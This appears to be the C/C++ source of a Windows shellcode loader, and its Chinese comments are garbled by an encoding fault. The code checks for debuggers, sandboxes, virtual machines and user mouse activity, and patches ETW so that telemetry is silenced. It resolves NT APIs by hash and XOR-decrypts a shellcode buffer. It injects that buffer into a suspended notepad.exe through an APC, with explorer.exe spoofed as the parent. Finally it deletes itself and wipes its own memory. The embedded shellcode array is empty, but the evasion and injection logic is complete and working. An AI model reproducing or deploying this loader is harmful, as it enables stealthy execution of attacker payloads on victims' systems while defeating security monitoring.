#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

// ��������꣨DEBUG ģʽ�����ã�
#define DEBUG_PRINT(fmt, ...) { \
    char dbg_buffer[256] = {0}; \
    sprintf_s(dbg_buffer, sizeof(dbg_buffer), "[DEBUG] " fmt "\n", __VA_ARGS__); \
    OutputDebugStringA(dbg_buffer); \
    printf("[DEBUG] " fmt "\n", __VA_ARGS__); \
}

// һ���򵥵� Base64 ���뺯���������ο���δ�������д��������
static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int base64_char_value(char c) {
    const char* p = strchr(base64_table, c);
    return p ? (int)(p - base64_table) : -1;
}

char* base64_decode(const char* data, size_t* out_len) {
    size_t len = strlen(data);
    if (len % 4 != 0) return NULL; // ��ʽ����

    size_t padding = 0;
    if (len >= 1 && data[len - 1] == '=') padding++;
    if (len >= 2 && data[len - 2] == '=') padding++;

    *out_len = (len / 4) * 3 - padding;
    char* decoded = (char*)malloc(*out_len + 1);
    if (!decoded) return NULL;

    size_t i = 0, j = 0;
    while (i < len) {
        int a = data[i] == '=' ? 0 : base64_char_value(data[i]); i++;
        int b = data[i] == '=' ? 0 : base64_char_value(data[i]); i++;
        int c = data[i] == '=' ? 0 : base64_char_value(data[i]); i++;
        int d = data[i] == '=' ? 0 : base64_char_value(data[i]); i++;

        decoded[j++] = (char)((a << 2) | (b >> 4));
        if (j < *out_len) decoded[j++] = (char)(((b & 15) << 4) | (c >> 2));
        if (j < *out_len) decoded[j++] = (char)(((c & 3) << 6) | d);
    }
    decoded[*out_len] = '\0';
    return decoded;
}

#define XOR_KEY 0xAA

// ԭ�� NT API ��ϣֵ����
DWORD HASH_NtAllocateVirtualMemory;
DWORD HASH_NtProtectVirtualMemory;
DWORD HASH_NtCreateThreadEx;
DWORD HASH_RtlCopyMemory;
DWORD HASH_NtWriteVirtualMemory;
DWORD HASH_NtQueueApcThread;

// ���º�� NT API ��ṹ
typedef struct _NtApiTable {
    FARPROC NtAllocateVirtualMemory;
    FARPROC NtProtectVirtualMemory;
    FARPROC NtCreateThreadEx;
    FARPROC RtlCopyMemory;
    FARPROC NtWriteVirtualMemory;
    FARPROC NtQueueApcThread;
} NtApiTable;

// ��ɳ���飺��������ڴ桢�������������Լ�����ɳ��ģ�飨���� Sandboxie��
BOOL AntiSandbox() {
    MEMORYSTATUSEX memInfo = { 0 };
    memInfo.dwLength = sizeof(memInfo);
    if (!GlobalMemoryStatusEx(&memInfo)) {
        DEBUG_PRINT("GlobalMemoryStatusEx call failed", 0);
        return TRUE; // ʧ��ʱ��Ϊ����ɳ�价��
    }
    if ((memInfo.ullTotalPhys / (1024 * 1024)) < 2048) {
        DEBUG_PRINT("Insufficient physical memory: %llu MB", memInfo.ullTotalPhys / (1024 * 1024));
        return TRUE;
    }

    SYSTEM_INFO sysInfo = { 0 };
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        DEBUG_PRINT("Insufficient number of processor cores: %u", sysInfo.dwNumberOfProcessors);
        return TRUE;
    }
    // ��� Sandboxie ģ��
    if (GetModuleHandleA("SbieDll.dll") != NULL) {
        DEBUG_PRINT("Sandboxie module detected", 0);
        return TRUE;
    }
    return FALSE;
}

// ��ָ���ļ���ȡ���ݣ������ػ�������ַ��ͬʱ����ȡ���ֽ������浽 *size ��
unsigned char* loadShellcode(const char* filename, size_t* size) {
    FILE* file;
    fopen_s(&file, filename, "rb");
    if (!file) {
        perror("fopen");
        return NULL;
    }

    // ��ȡ�ļ���С
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    rewind(file);

    // Ϊ�ļ����ݷ����ڴ�
    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    if (!buffer) {
        fclose(file);
        fprintf(stderr, "Memory allocation failed!\n");
        return NULL;
    }

    // ��ȡ�ļ����ݵ�������
    size_t bytesRead = fread(buffer, 1, fileSize, file);
    if (bytesRead != fileSize) {
        free(buffer);
        fclose(file);
        fprintf(stderr, "Failed to read file!\n");
        return NULL;
    }
    fclose(file);

    *size = fileSize;  // �����ļ�����
    return buffer;
}

// �����Լ�飺ʹ�� IsDebuggerPresent �� CheckRemoteDebuggerPresent
BOOL AntiDebug() {
    if (IsDebuggerPresent()) {
        DEBUG_PRINT("Debugger detected by IsDebuggerPresent", 0);
        return TRUE;
    }
    BOOL debuggerFound = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerFound) && debuggerFound) {
        DEBUG_PRINT("Debugger detected by CheckRemoteDebuggerPresent", 0);
        return TRUE;
    }
    return FALSE;
}

// �������⣺������������
BOOL IsVirtualMachine() {
    // ������������
    if (GetModuleHandleA("vmci.sys") || GetModuleHandleA("vboxdrv.sys")) {
        DEBUG_PRINT("Virtual machine driver detected", 0);
        return TRUE;
    }
    // ���ע�����
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, R"(HARDWARE\ACPI\DSDT\VBOX__)", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        DEBUG_PRINT("Virtual machine registry key detected", 0);
        return TRUE;
    }
    return FALSE;
}

// �û���Ϊ��⣺�������ƶ�
BOOL IsUserActive() {
    POINT lastPoint, currentPoint;
    GetCursorPos(&lastPoint);
    Sleep(1000); // �ȴ�1��
    GetCursorPos(&currentPoint);
    if (lastPoint.x == currentPoint.x && lastPoint.y == currentPoint.y) {
        DEBUG_PRINT("No mouse movement detected", 0);
        return FALSE;
    }
    return TRUE;
}

// �ַ�����ϣ�����������ο���
DWORD RtlHashString(CHAR* str) {
    DWORD hash = 0;
    while (*str) {
        // ת��ΪСд������ַ��Ǵ�д��ĸ��
        CHAR c = *str;
        if (c >= 'A' && c <= 'Z')
            c += 0x20;
        // ��ת�� 13 λ
        hash = (hash >> 13) | (hash << (32 - 13));
        hash += c;
        str++;
    }
    return hash & 0x7FFFFFFF;
}

// ��Ȩ����
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL);
    CloseHandle(hToken);
    return result;
}

/*
    ���� ntdll.dll ���������� API �������ø� API �Ĺ�ϣֵ
    �Ż��㣺�� Base64 ����Ĺ����滻ΪԤ�ȶ���õ� API ���Ƴ�������
*/
void GetAllAPINames(HMODULE hModule) {
    // Ԥ���� API ���Ƴ�������
    const char* apiNames[6] = {
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "RtlCopyMemory",
        "NtWriteVirtualMemory",
        "NtQueueApcThread"
    };

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    DWORD exportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRVA == 0) return;
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirRVA);
    DWORD numberOfNames = pExportDir->NumberOfNames;
    PDWORD pNames = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfNames);
    for (DWORD i = 0; i < numberOfNames; i++) {
        CHAR* funcName = (CHAR*)((BYTE*)hModule + pNames[i]);
        DWORD hash = RtlHashString(funcName);
        if (!strcmp(funcName, apiNames[0])) {
            HASH_NtAllocateVirtualMemory = hash;
        }
        else if (!strcmp(funcName, apiNames[1])) {
            HASH_NtProtectVirtualMemory = hash;
        }
        else if (!strcmp(funcName, apiNames[2])) {
            HASH_NtCreateThreadEx = hash;
        }
        else if (!strcmp(funcName, apiNames[3])) {
            HASH_RtlCopyMemory = hash;
        }
        else if (!strcmp(funcName, apiNames[4])) {
            HASH_NtWriteVirtualMemory = hash;
        }
        else if (!strcmp(funcName, apiNames[5])) {
            HASH_NtQueueApcThread = hash;
        }
    }
}

/*
    ��̬��ȡ API ��ַ�������������Աȼ����Ĺ�ϣֵ
*/
FARPROC GetAPI(HMODULE hModule, DWORD targetHash) {
    if (!hModule) {
        DEBUG_PRINT("Module handle is NULL", 0);
        return NULL;
    }

    // ��� DOS ͷ��Ч��
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        DEBUG_PRINT("Invalid DOS signature", 0);
        return NULL;
    }

    // ��ȡ NT ͷ��
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        DEBUG_PRINT("Invalid NT signature", 0);
        return NULL;
    }

    // ��ȡ����Ŀ¼�� RVA
    DWORD exportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRVA == 0) {
        DEBUG_PRINT("No export directory", 0);
        return NULL;
    }

    // ��ȡ����Ŀ¼ָ��
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirRVA);
    DWORD numberOfNames = pExportDir->NumberOfNames;
    if (numberOfNames == 0) {
        DEBUG_PRINT("No names in export table", 0);
        return NULL;
    }

    PDWORD pNames = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfNames);
    PWORD pOrdinals = (PWORD)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);
    PDWORD pFunctions = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfFunctions);

    for (DWORD i = 0; i < numberOfNames; i++) {
        CHAR* pFuncName = (CHAR*)((BYTE*)hModule + pNames[i]);
        if ((RtlHashString(pFuncName) & 0x7FFFFFFF) == targetHash) {
            DEBUG_PRINT("Resolved API: %s", pFuncName);
            WORD ordinal = pOrdinals[i];
            DWORD funcRVA = pFunctions[ordinal];
            return (FARPROC)((BYTE*)hModule + funcRVA);
        }
    }

    DEBUG_PRINT("No matching API found", 0);
    return NULL;
}

// �ӳ�ִ�У��� Sleep ���ã�
void DelayExecution(DWORD ms) {
    DWORD start = GetTickCount();
    while ((GetTickCount() - start) < ms) {
        SwitchToThread();
    }
}

// �ƹ� ETW ��⣺�� EtwEventWrite �������ֽ��滻Ϊ RET ָ��
void BypassETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    PVOID pEtwEventWrite = (PVOID)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return;
    DWORD oldProtect;
    if (VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        *(PBYTE)pEtwEventWrite = 0xC3; // RET
        VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
        DEBUG_PRINT("ETW bypassed", 0);
    }
}

// ���ѡ��Ŀ��������ƣ���ѡ�񳣼�ϵͳ�������ƣ�
const CHAR* GetRandomProcessName() {
    const CHAR* processes[] = {
        "notepad.exe"
    };
    return processes[GetTickCount() % (sizeof(processes) / sizeof(CHAR*))];
}

DWORD FindParentProcessID(const wchar_t* processName) {
    PROCESSENTRY32W pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return 0;
}

// ���� NT API ����ָ������
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, LPVOID, HANDLE, LPTHREAD_START_ROUTINE, LPVOID, BOOL, ULONG, ULONG, ULONG, LPVOID);
typedef NTSTATUS(NTAPI* RtlCopyMemory_t)(PVOID Dest, const PVOID Src, SIZE_T Len);
typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* NtQueueApcThread_t)(HANDLE, PVOID, PVOID, PVOID);

// APC ע�뺯��
BOOL APCInjection(const NtApiTable* nt, PVOID shellcode, SIZE_T shellcodeSize) {
    // Validate input parameters.
    if (!nt || !shellcode || shellcodeSize == 0) {
        DEBUG_PRINT("Invalid input parameters.");
        return FALSE;
    }

    BOOL bResult = FALSE;
    STARTUPINFOEXA siEx = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    PVOID remoteMem = NULL;
    SIZE_T memSize = shellcodeSize;
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = NULL;
    HANDLE hParentProcess = NULL;

    // Initialize STARTUPINFOEXA structure.
    siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Retrieve a random target process name.
    const CHAR* procName = GetRandomProcessName();
    if (!procName) {
        DEBUG_PRINT("Failed to get target process name.");
        return FALSE;
    }

    // Identify and open the parent process (e.g., explorer.exe).
    const CHAR* parentProcessName = "explorer.exe";
    DWORD parentPID = FindParentProcessID(L"explorer.exe");
    if (parentPID == 0) {
        DEBUG_PRINT("Failed to find parent process: %s", parentProcessName);
        return FALSE;
    }

    hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPID);
    if (!hParentProcess) {
        DEBUG_PRINT("Failed to open parent process (PID: %d), error: %d", parentPID, GetLastError());
        return FALSE;
    }

    // Initialize the attribute list for process creation.
    SIZE_T attributeSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    lpAttributeList = static_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(HeapAlloc(GetProcessHeap(), 0, attributeSize));
    if (!lpAttributeList) {
        DEBUG_PRINT("Heap allocation for attribute list failed.");
        goto cleanup;
    }

    if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &attributeSize)) {
        DEBUG_PRINT("InitializeProcThreadAttributeList failed, error: %d", GetLastError());
        goto cleanup;
    }

    // Set the parent process attribute.
    if (!UpdateProcThreadAttribute(lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParentProcess,
        sizeof(HANDLE),
        NULL,
        NULL)) {
        DEBUG_PRINT("UpdateProcThreadAttribute failed, error: %d", GetLastError());
        goto cleanup;
    }
    siEx.lpAttributeList = lpAttributeList;

    // Create the target process in a suspended state with extended startup information.
    if (!CreateProcessA(
        NULL,
        const_cast<LPSTR>(procName),
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &siEx.StartupInfo,
        &pi)) {
        DEBUG_PRINT("CreateProcessA failed, error: %d", GetLastError());
        goto cleanup;
    }

    // Clean up attribute list and close the parent process handle as they are no longer needed.
    if (lpAttributeList) {
        DeleteProcThreadAttributeList(lpAttributeList);
        HeapFree(GetProcessHeap(), 0, lpAttributeList);
        lpAttributeList = NULL;
    }
    CloseHandle(hParentProcess);
    hParentProcess = NULL;

    // Initialize function pointers from the NT API table.
    NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = reinterpret_cast<NtAllocateVirtualMemory_t>(nt->NtAllocateVirtualMemory);
    NtWriteVirtualMemory_t pNtWriteVirtualMemory = reinterpret_cast<NtWriteVirtualMemory_t>(nt->NtWriteVirtualMemory);
    NtQueueApcThread_t pNtQueueApcThread = reinterpret_cast<NtQueueApcThread_t>(nt->NtQueueApcThread);

    // Allocate memory in the remote process.
    NTSTATUS status = pNtAllocateVirtualMemory(pi.hProcess, &remoteMem, 0, &memSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0 || !remoteMem) {
        DEBUG_PRINT("NtAllocateVirtualMemory failed in remote process: 0x%X", status);
        goto cleanup;
    }

    // Write the shellcode into the allocated memory.
    status = pNtWriteVirtualMemory(pi.hProcess, remoteMem, shellcode, shellcodeSize, NULL);
    if (status != 0) {
        DEBUG_PRINT("NtWriteVirtualMemory failed: 0x%X", status);
        goto cleanup;
    }

    // Queue an APC to the target thread.
    status = pNtQueueApcThread(pi.hThread, remoteMem, NULL, NULL);
    if (status != 0) {
        DEBUG_PRINT("NtQueueApcThread failed: 0x%X", status);
        goto cleanup;
    }

    // Resume the suspended thread to execute the APC.
    ResumeThread(pi.hThread);
    DEBUG_PRINT("Successfully injected APC into process %s", procName);
    bResult = TRUE;

cleanup:
    if (!bResult && pi.hProcess) {
        TerminateProcess(pi.hProcess, 0);
    }
    if (pi.hThread) {
        CloseHandle(pi.hThread);
    }
    if (pi.hProcess) {
        CloseHandle(pi.hProcess);
    }
    if (hParentProcess) {
        CloseHandle(hParentProcess);
    }
    if (lpAttributeList) {
        DeleteProcThreadAttributeList(lpAttributeList);
        HeapFree(GetProcessHeap(), 0, lpAttributeList);
    }
    return bResult;
}

// �ڴ�������
void CleanMemory(PVOID mem, SIZE_T size) {
    memset(mem, 0, size);
    VirtualFree(mem, 0, MEM_RELEASE);
}

// �ļ���ɾ������
void SelfDelete() {
    char tempPath[MAX_PATH];
    char batPath[MAX_PATH];
    char modulePath[MAX_PATH];

    // ��ȡ��ǰģ��·��
    GetModuleFileNameA(NULL, modulePath, MAX_PATH);
    GetTempPathA(MAX_PATH, tempPath);
    sprintf_s(batPath, sizeof(batPath), "%s\\self_delete.bat", tempPath);

    FILE* batFile;
    fopen_s(&batFile, batPath, "w");
    if (batFile) {
        fprintf(batFile, ":Repeat\n");
        fprintf(batFile, "del \"%s\"\n", modulePath);
        fprintf(batFile, "if exist \"%s\" goto Repeat\n", modulePath);
        fprintf(batFile, "del \"%s\"\n", batPath);
        fclose(batFile);
    }

    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA(NULL, (LPSTR)batPath, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi);
}

// --- �����غ��� ---
// ����⡢���ܡ���ͨ�� APC ע��ִ�� shellcode
void ExecuteShellcode() {
    // �����ԡ���ɳ�����������
    if (AntiDebug() || AntiSandbox() || IsVirtualMachine()) {
        DEBUG_PRINT("Debugging/sandbox/virtual machine environment detected, exiting program", 0);
        ExitProcess(0);
    }

    // �û���Ϊ���
    if (!IsUserActive()) {
        DEBUG_PRINT("No mouse movement detected, exiting program", 0);
        ExitProcess(0);
    }

    // �ƹ� ETW ���
    BypassETW();

    // �ӳ�ִ���Զ�ܾ�̬����
    DelayExecution(5000);

    // ��Ȩ����
    if (!EnableDebugPrivilege()) {
        DEBUG_PRINT("Failed to enable debug privilege", 0);
    }
    else {
        DEBUG_PRINT("Debug privilege enabled successfully", 0);
    }

    size_t shellcodeLen = 0;
     //�˴���ʹ�� loadShellcode ���ļ����ؼ��ܺ�� shellcode
    //unsigned char* encryptedShellcode = loadShellcode("payloadtest.data", &shellcodeLen);

    // ʾ������Ƕ���ܺ�� shellcode ����
    unsigned char encryptedShellcode[] = {
 };
    shellcodeLen = sizeof(encryptedShellcode);
    if (!encryptedShellcode) {
        DEBUG_PRINT("Failed to load shellcode", 0);
        ExitProcess(0);
    }

    // ��ʼ�� NT API ��
    NtApiTable nt = { 0 };
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        DEBUG_PRINT("Failed to get ntdll.dll", 0);
        ExitProcess(0);
    }
    GetAllAPINames(hNtdll);

    nt.NtAllocateVirtualMemory = GetAPI(hNtdll, HASH_NtAllocateVirtualMemory);
    nt.NtProtectVirtualMemory = GetAPI(hNtdll, HASH_NtProtectVirtualMemory);
    nt.NtCreateThreadEx = GetAPI(hNtdll, HASH_NtCreateThreadEx);
    nt.RtlCopyMemory = GetAPI(hNtdll, HASH_RtlCopyMemory);
    nt.NtWriteVirtualMemory = GetAPI(hNtdll, HASH_NtWriteVirtualMemory);
    nt.NtQueueApcThread = GetAPI(hNtdll, HASH_NtQueueApcThread);

    if (!nt.NtAllocateVirtualMemory || !nt.NtProtectVirtualMemory ||
        !nt.NtCreateThreadEx || !nt.RtlCopyMemory || !nt.NtWriteVirtualMemory || !nt.NtQueueApcThread) {
        DEBUG_PRINT("Failed to resolve NT APIs", 0);
        ExitProcess(0);
    }

    // ���� shellcode��XOR ���ܣ�
    for (unsigned int i = 0; i < shellcodeLen; i++) {
        encryptedShellcode[i] ^= XOR_KEY;
    }
    DEBUG_PRINT("Shellcode decrypted successfully", 0);

    // ���� APC ע�뷽ʽִ�� shellcode
    if (!APCInjection(&nt, encryptedShellcode, shellcodeLen)) {
        DEBUG_PRINT("APC injection failed", 0);
        ExitProcess(0);
    }

    // �����ڴ�
    CleanMemory(encryptedShellcode, shellcodeLen);

    // ��ɾ��
    SelfDelete();
}

// �ڴ��Բ���������֧�ֶ��̲߳�����
void WipeMemoryAsync() {
    // ���������߳�ִ�в�������
    CreateThread(NULL, 0, [](LPVOID) -> DWORD {
        MEMORY_BASIC_INFORMATION mbi;
        PBYTE pAddr = 0;

        while (VirtualQuery(pAddr, &mbi, sizeof(mbi))) {
            if (mbi.State == MEM_COMMIT && mbi.AllocationBase == GetModuleHandle(NULL)) {
                // ���������������
                BYTE* randomData = (BYTE*)malloc(mbi.RegionSize);
                if (randomData) {
                    for (SIZE_T i = 0; i < mbi.RegionSize; ++i) {
                        randomData[i] = rand() % 256;
                    }
                    DWORD oldProtect;
                    VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_READWRITE, &oldProtect);
                    memcpy(mbi.BaseAddress, randomData, mbi.RegionSize);
                    VirtualProtect(mbi.BaseAddress, mbi.RegionSize, oldProtect, &oldProtect);
                    free(randomData);
                }
            }
            pAddr += mbi.RegionSize;
        }
        return 0;
        }, NULL, 0, NULL);
}


// TLS �ص��������� DLL_PROCESS_ATTACH ʱ���������ڴ棨������ DLL��Ҳ�������� EXE��
#ifdef _MSC_VER
#pragma comment(linker, "/INCLUDE:_tls_used")
#endif
void NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason == DLL_PROCESS_ATTACH) {
        MEMORY_BASIC_INFORMATION mbi;
        VirtualQuery((PVOID)&TlsCallback, &mbi, sizeof(mbi));
        BYTE* base = (BYTE*)mbi.AllocationBase;
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
        DWORD size = nt->OptionalHeader.SizeOfImage;
        SecureZeroMemory(base, size);
    }
}
#ifdef _MSC_VER
#pragma data_seg(".CRT$XLB")
EXTERN_C PIMAGE_TLS_CALLBACK pTlsCallback = TlsCallback;
#pragma data_seg()
#endif

// �ڳ����ʼ���׶�����쳣TLS�ص�
void SanitizeTlsCallbacks() {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)dosHeader + dosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY tlsDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

    if (tlsDir.VirtualAddress) {
        PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)((BYTE*)dosHeader + tlsDir.VirtualAddress);
        PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;

        // �����Ԥ�ڵ�TLS�ص�
        while (callback && *callback) {
            if (*callback != TlsCallback) { // ֻ���������Լ��Ļص�
                DWORD oldProtect;
                VirtualProtect(callback, sizeof(PVOID), PAGE_READWRITE, &oldProtect);
                *callback = NULL;
                VirtualProtect(callback, sizeof(PVOID), oldProtect, &oldProtect);
            }
            callback++;
        }
    }
}


// ������ڵ�
int main() {
    DEBUG_PRINT("Starting shellcode execution", 0);
    SanitizeTlsCallbacks();
    ExecuteShellcode();
    WipeMemoryAsync();
    return 0;
}
